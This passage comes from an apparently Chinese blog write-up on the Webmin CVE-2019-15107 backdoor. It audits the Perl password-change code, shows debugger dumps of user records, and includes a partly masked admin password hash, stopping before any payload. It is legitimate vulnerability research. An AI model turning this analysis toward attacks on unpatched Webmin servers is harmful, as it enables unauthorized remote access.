<span class="token keyword">my</span> <span class="token variable">@res</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">@_</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">my</span> <span class="token variable">$code</span> <span class="token operator">=</span> shift<span class="token punctuation">;</span>
    <span class="token keyword">my</span> <span class="token variable">$msg</span> <span class="token operator">=</span> shift<span class="token punctuation">;</span>
    <span class="token keyword">my</span> <span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$messages</span> <span class="token operator">=</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> PAM_PROMPT_ECHO_ON<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true"># Assume asking for username</span>
        push <span class="token variable">@res</span><span class="token punctuation">,</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        push <span class="token variable">@res</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> PAM_PROMPT_ECHO_OFF<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true"># Assume asking for a password (old first, then new)</span>
        push <span class="token variable">@res</span><span class="token punctuation">,</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$msg</span> <span class="token operator">=~</span> <span class="token regex">/old|current|login/i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            push <span class="token variable">@res</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            push <span class="token variable">@res</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true"># Some message .. ignore it</span>
        push <span class="token variable">@res</span><span class="token punctuation">,</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        push <span class="token variable">@res</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
push <span class="token variable">@res</span><span class="token punctuation">,</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
return <span class="token variable">@res</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先，源码12行会判断网站是否开启了密码重置功能，如未开启则会显示<code>&quot;Password changing is not enabled!&quot;</code>并终止后续代码的执行；该部分正如上文开启的重置功能<code>miniserv.conf</code>文件中<code>passwd_mode=2</code>相对应。</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_mode'</span><span class="token punctuation">}</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">||</span> <span class="token keyword">die</span> <span class="token string">"Password changing is not enabled!"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>紧接着14-16行代码会判断用户输入的新密码<code>new1</code>、<code>new2</code>是否规范：新密码1不能为空并且需要等于新密码2</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token comment" spellcheck="true"># Validate inputs</span>
<span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span> <span class="token operator">ne</span> <span class="token string">''</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_enew1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new2'</span><span class="token punctuation">}</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_enew2'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果新密码不符合规范，则会进入<code>pass_error()</code>函数中，跟进<code>pass_error()</code></p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token function"><span class="token keyword">sub</span> pass_error</span>
<span class="token punctuation">{</span>
<span class="token variable">&amp;header</span><span class="token punctuation">(</span><span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span> <span class="token variable">&amp;ui_hr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">print</span> <span class="token string">"&lt;center>&lt;h3>"</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_err'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">" : "</span><span class="token punctuation">,</span><span class="token variable">@_</span><span class="token punctuation">,</span><span class="token string">"&lt;/h3>&lt;/center>\n"</span><span class="token punctuation">;</span>

<span class="token keyword">print</span> <span class="token variable">&amp;ui_hr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">&amp;footer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>pass_error()</code>函数仅仅是对错误信息打印输出的一个封装，如果新密码不规范则会打印<code>print</code>相关错误信息并退出代码的执行<code>exit;</code></p>
<p>18-31行代码会判断用户提交的<code>user</code>是否是<code>Webmin</code>用户</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token comment" spellcheck="true"># Is this a Webmin user?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">&amp;foreign_check</span><span class="token punctuation">(</span><span class="token string">"acl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"acl"</span><span class="token punctuation">,</span> <span class="token string">"acl-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token punctuation">)</span> <span class="token operator">=</span> grep <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">&amp;acl::list_users</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token string">'x'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true"># A Webmin user, but using Unix authentication</span>
        <span class="token variable">$wuser</span> <span class="token operator">=</span> <span class="token keyword">undef</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token string">'*LK*'</span> <span class="token operator">||</span>
           <span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'pass'</span><span class="token punctuation">}</span> <span class="token operator">=~</span> <span class="token regex">/^\!/</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token string">"Webmin users with locked accounts cannot change "</span><span class="token operator">.</span>
                       <span class="token string">"their passwords!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先引入<code>acl/acl-lib.pl</code>文件进行用户信息列表的查询，通过设置断点查看<code>acl::list_users();</code>用户信息列表</p>
<p>针对perl代码的审计：源码开头引入<code>use Data::Dumper;</code>，然后通过Dumper函数进行数据的打印</p>
<pre class="line-numbers language-perl"><code class="language-perl">BEGIN <span class="token punctuation">{</span> push<span class="token punctuation">(</span><span class="token variable">@INC</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> WebminCore<span class="token punctuation">;</span>
<span class="token keyword">use</span> Data<span class="token punctuation">:</span><span class="token punctuation">:</span>Dumper<span class="token punctuation">;</span>

<span class="token operator">...</span><span class="token operator">...</span>

<span class="token comment" spellcheck="true"># Is this a Webmin user?</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">&amp;foreign_check</span><span class="token punctuation">(</span><span class="token string">"acl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"acl"</span><span class="token punctuation">,</span> <span class="token string">"acl-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token punctuation">)</span> <span class="token operator">=</span> grep <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">&amp;acl::list_users</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span> Dumper<span class="token punctuation">(</span>acl<span class="token punctuation">:</span><span class="token punctuation">:</span>list_users<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">...</span><span class="token operator">...</span><span class="token operator">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020152821255.png" alt="image-20201020152821255"></p>
<pre class="line-numbers language-txt"><code class="language-txt"><p>$VAR1 = {
          'twofactor_provider' => undef,
          'cert' => '',
          'temppass' => 0,
          'twofactor_apikey' => undef,
          'name' => 'root',
          'pass' => 'x',
          'logouttime' => undef,
          'nochange' => 0,
          'notabs' => undef,
          'minsize' => '',
          'twofactor_id' => undef,
          'lang' => undef,
          'modules' => [
                         'backup-config',
                         'change-user',
                         'webmincron',
                         'usermin',
                         'webminlog',
                         'webmin',
                         'servers',
                         'acl',
                         'bacula-backup',
                         'init',
                         'passwd',
                         'quota',
                         'mount',
                         'fsdump',
                         'ldap-client',
                         'ldap-useradmin',
                         'logrotate',
                         'mailcap',
                         'mon',
                         'pam',
                         'proc',
                         'at',
                         'cron',
                         'package-updates',
                         'software',
                         'man',
                         'syslog',
                         'syslog-ng',
                         'system-status',
                         'useradmin',
                         'apache',
                         'bind8',
                         'dhcpd',
                         'dovecot',
                         'exim',
                         'fetchmail',
                         'jabber',
                         'ldap-server',
                         'mysql',
                         'openslp',
                         'postfix',
                         'postgresql',
                         'proftpd',
                         'procmail',
                         'qmailadmin',
                         'mailboxes',
                         'sshd',
                         'samba',
                         'sendmail',
                         'spam',
                         'squid',
                         'sarg',
                         'wuftpd',
                         'webalizer',
                         'adsl-client',
                         'bandwidth',
                         'fail2ban',
                         'firewalld',
                         'ipsec',
                         'krb5',
                         'firewall',
                         'firewall6',
                         'nis',
                         'net',
                         'xinetd',
                         'inetd',
                         'pap',
                         'ppp-client',
                         'pptp-client',
                         'pptp-server',
                         'stunnel',
                         'shorewall',
                         'shorewall6',
                         'tcpwrappers',
                         'idmapd',
                         'filter',
                         'burner',
                         'grub',
                         'raid',
                         'lvm',
                         'lpadmin',
                         'smart-status',
                         'time',
                         'vgetty',
                         'iscsi-client',
                         'iscsi-server',
                         'iscsi-tgtd',
                         'iscsi-target',
                         'cluster-passwd',
                         'cluster-copy',
                         'cluster-cron',
                         'cluster-shell',
                         'cluster-software',
                         'cluster-usermin',
                         'cluster-useradmin',
                         'cluster-webmin',
                         'heartbeat',
                         'shell',
                         'custom',
                         'filemin',
                         'tunnel',
                         'phpini',
                         'cpan',
                         'htaccess-htpasswd',
                         'telnet',
                         'status',
                         'ajaxterm',
                         'updown'
                       ],
          'rbacdeny' => undef,
          'sync' => '',
          'readonly' => undef,
          'olds' => [],
          'real' => undef,
          'ownmods' => [],
          'lastchange' => ''
        };
$VAR2 = {
          'real' => undef,
          'ownmods' => [],
          'olds' => [],
          'lastchange' => '',
          'sync' => '0',
          'readonly' => undef,
          'modules' => [
                         'acl',
                         'adsl-client',
                         'ajaxterm',
                         'apache',
                         'at',
                         'backup-config',
                         'bacula-backup',
                         'bandwidth',
                         'bind8',
                         'bsdfdisk',
                         'burner',
                         'change-user',
                         'cluster-copy',
                         'cluster-cron',
                         'cluster-passwd',
                         'cluster-shell',
                         'cluster-software',
                         'cluster-useradmin',
                         'cluster-usermin',
                         'cluster-webmin',
                         'cpan',
                         'cron',
                         'custom',
                         'dfsadmin',
                         'dhcpd',
                         'dovecot',
                         'exim',
                         'fail2ban',
                         'fetchmail',
                         'filemin',
                         'filter',
                         'firewall',
                         'firewall6',
                         'firewalld',
                         'format',
                         'fsdump',
                         'grub',
                         'heartbeat',
                         'htaccess-htpasswd',
                         'idmapd',
                         'inetd',
                         'init',
                         'inittab',
                         'ipfilter',
                         'ipfw',
                         'ipsec',
                         'iscsi-client',
                         'iscsi-server',
                         'iscsi-target',
                         'iscsi-tgtd',
                         'jabber',
                         'krb5',
                         'ldap-client',
                         'ldap-server',
                         'ldap-useradmin',
                         'logrotate',
                         'lpadmin',
                         'lvm',
                         'mailboxes',
                         'mailcap',
                         'man',
                         'mon',
                         'mount',
                         'mysql',
                         'net',
                         'nis',
                         'openslp',
                         'package-updates',
                         'pam',
                         'pap',
                         'passwd',
                         'phpini',
                         'postfix',
                         'postgresql',
                         'ppp-client',
                         'pptp-client',
                         'pptp-server',
                         'proc',
                         'procmail',
                         'proftpd',
                         'qmailadmin',
                         'quota',
                         'raid',
                         'samba',
                         'sarg',
                         'sendmail',
                         'servers',
                         'shell',
                         'shorewall',
                         'shorewall6',
                         'smart-status',
                         'smf',
                         'software',
                         'spam',
                         'squid',
                         'sshd',
                         'status',
                         'stunnel',
                         'syslog-ng',
                         'syslog',
                         'system-status',
                         'tcpwrappers',
                         'telnet',
                         'time',
                         'tunnel',
                         'updown',
                         'useradmin',
                         'usermin',
                         'vgetty',
                         'webalizer',
                         'webmin',
                         'webmincron',
                         'webminlog',
                         'wuftpd',
                         'xinetd'
                       ],
          'lang' => undef,
          'rbacdeny' => undef,
          'notabs' => undef,
          'nochange' => 0,
          'minsize' => '',
          'twofactor_id' => undef,
          'logouttime' => undef,
          'twofactor_apikey' => undef,
          'name' => 'admin',
          'pass' => '$1$XXXXXXXX$bOc2gqbM67QUX/Oe0I7UM/',
          'temppass' => 0,
          'twofactor_provider' => undef,
          'cert' => ''
        };
$VAR3 = {
          'nochange' => 0,
          'notabs' => undef,
          'minsize' => '',
          'twofactor_id' => undef,
          'modules' => [
                         'backup-config',
                         'change-user',
                         'webmincron',
                         'usermin',
                         'webminlog',
                         'webmin',
                         'servers',
                         'acl',
                         'bacula-backup',
                         'init',
                         'passwd',
                         'quota',
                         'mount',
                         'fsdump',
                         'ldap-client',
                         'ldap-useradmin',
                         'logrotate',
                         'mailcap',
                         'mon',
                         'pam',
                         'proc',
                         'at',
                         'cron',
                         'package-updates',
                         'software',
                         'man',
                         'syslog',
                         'syslog-ng',
                         'system-status',
                         'useradmin',
                         'apache',
                         'bind8',
                         'dhcpd',
                         'dovecot',
                         'exim',
                         'fetchmail',
                         'jabber',
                         'ldap-server',
                         'mysql',
                         'openslp',
                         'postfix',
                         'postgresql',
                         'proftpd',
                         'procmail',
                         'qmailadmin',
                         'mailboxes',
                         'sshd',
                         'samba',
                         'sendmail',
                         'spam',
                         'squid',
                         'sarg',
                         'wuftpd',
                         'webalizer',
                         'adsl-client',
                         'bandwidth',
                         'fail2ban',
                         'firewalld',
                         'ipsec',
                         'krb5',
                         'firewall',
                         'firewall6',
                         'nis',
                         'net',
                         'xinetd',
                         'inetd',
                         'pap',
                         'ppp-client',
                         'pptp-client',
                         'pptp-server',
                         'stunnel',
                         'shorewall',
                         'shorewall6',
                         'tcpwrappers',
                         'idmapd',
                         'filter',
                         'burner',
                         'grub',
                         'raid',
                         'lvm',
                         'lpadmin',
                         'smart-status',
                         'time',
                         'vgetty',
                         'iscsi-client',
                         'iscsi-server',
                         'iscsi-tgtd',
                         'iscsi-target',
                         'cluster-passwd',
                         'cluster-copy',
                         'cluster-cron',
                         'cluster-shell',
                         'cluster-software',
                         'cluster-usermin',
                         'cluster-useradmin',
                         'cluster-webmin',
                         'heartbeat',
                         'shell',
                         'custom',
                         'filemin',
                         'tunnel',
                         'phpini',
                         'cpan',
                         'htaccess-htpasswd',
                         'telnet',
                         'status',
                         'ajaxterm',
                         'updown'
                       ],
          'lang' => undef,
          'rbacdeny' => undef,
          'sync' => '',
          'readonly' => undef,
          'real' => undef,
          'olds' => [],
          'ownmods' => [],
          'lastchange' => '',
          'twofactor_provider' => undef,
          'cert' => '',
          'temppass' => 0,
          'twofactor_apikey' => undef,
          'name' => 'rose',
          'pass' => 'x',
          'logouttime' => undef
        };
</p>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过断点数据，以字典的形式显示了每个用户的详细信息：可操作模块<code>&#39;modules&#39;</code>、用户名<code>&#39;name&#39;</code>、用户密码<code>&#39;pass&#39;</code>等</p>
<p>继续审计18-31行代码，21行通过<code>acl::list_users()</code>获取用户信息列表之后，通过grep筛选出存在的webmin用户，<code>$in{&#39;user&#39;}</code>为用户输入的<code>user</code>、<code>$_-&gt;{&#39;name&#39;}</code>为webmin用户，如果这里未从字典中匹配到webmin用户，也就是说用户提交的user不存在，则<code>$wuser</code>赋值为<code>undef</code>。</p>
<blockquote>
<p>undef是perl中变量未初始化时的默认值。当这个未初始化的变量被当做整型来使用时，那么undef就是0；当这个变量被当做字符串来使用时，那么undef就是空字符串。所以当在perl中使用一个未经过初始化的变量时，程序的运行是没有问题的。</p>
</blockquote>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020160842603.png" alt="image-20201020160842603"></p>
<p>下面的审计需要特别注意一下，<code>undef</code>在if条件里默认为False，如果用户提交的<code>user</code>不存在即<code>$wuser=undef</code>，但是<code>$wuser</code>经过紧接着的22-25行代码的if判断处理会变成<code>{}</code>，而<code>{}</code>在if条件里默认为True：<code>$wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;</code>该处逻辑比对会致使原本的<code>undef</code>变为<code>{}</code>。</p>
<p>注意：这里只是通过if判断使<code>$wuser</code>变为了<code>{}</code>，而此处的if条件<code>$wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;</code>结果是为False的，当用户提交的<code>user</code>不存在或者为特定系统用户的时候。</p>
<p>下断点进行调试查看</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020161148781.png" alt="image-20201020161148781"></p>
<p>思考，这里为什么要将查询的用户的密码与字符串<code>x</code>比较呢？？</p>
<p>下面就涉及到了webmin用户的几种认证方法：普通webmin用户认证、系统webmin用户认证<code>Unix authenticaton</code>。</p>
<p>首先，正常情况下系统用户不同于webmin用户：<code>system user != webmin user</code>，但是webmin可以在经过配置添加特定系统用户的情况下，使特定系统用户可直接登录webmin。</p>
<p>添加不同的webmin用户：登录webmin依次访问<code>webmin-&gt;webmin user-&gt;Create a new Webmin user</code>进行创建</p>
<ul>
<li>特定系统用户root</li>
</ul>
<p>添加的系统用户，在系统中必须存在，Username选择想要添加的系统用户、Password为认证方式（选择Unix authentication认证，不需要输入密码，实质上是通过Linux系统/etc/shadow进行认证的）</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020165712324.png" alt="image-20201020165712324"></p>
<ul>
<li>普通webmin用户-非系统用户</li>
</ul>
<p>与系统用户无关，Username为普通用户、Password为认证方式（配置密码认证）</p>
<p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020170243321.png" alt="image-20201020170243321"></p>
<ul>
<li>查看webmin几种用户</li>
</ul>
<pre><code>root与rose：特定系统用户

admin：普通webmin用户</code></pre><p><img src="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/image-20201020170810176.png" alt="image-20201020170810176"></p>
<p>查看webmin对几种用户的密码存储方式</p>
<pre class="line-numbers language-bash"><code class="language-bash">root@rose:/usr/local/share/webmin/webmin-1.920<span class="token comment" spellcheck="true"># cat /etc/webmin/webmin-1.920/miniserv.users</span>
root:x
admin:<span class="token variable">$1</span><span class="token variable">$XXXXXXXX</span><span class="token variable">$bOc2gqbM67QUX</span>/Oe0I7UM/:0
rose:x::::::::::::
root@rose:/usr/local/share/webmin/webmin-1.920<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>了解了webmin几种用户认证方式，那么代码中<code>if ($wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;)</code>判断用户密码是否为<code>x</code>也就是判断用户提交的<code>user</code>是否为webmin添加的特定的系统用户，如果是的话就会将<code>$wuser</code>赋值为<code>undef</code>使用户无法进入37-47行代码中更改Linux系统用户账户密码【看来webmin项目做的还挺好的，值得一赞】。</p>
<p>继续后续的审计分析，测试<code>undef</code>与<code>{}</code>的区别</p>
<pre class="line-numbers language-perl"><code class="language-perl"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">undef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"undef If True"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"undef If False"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

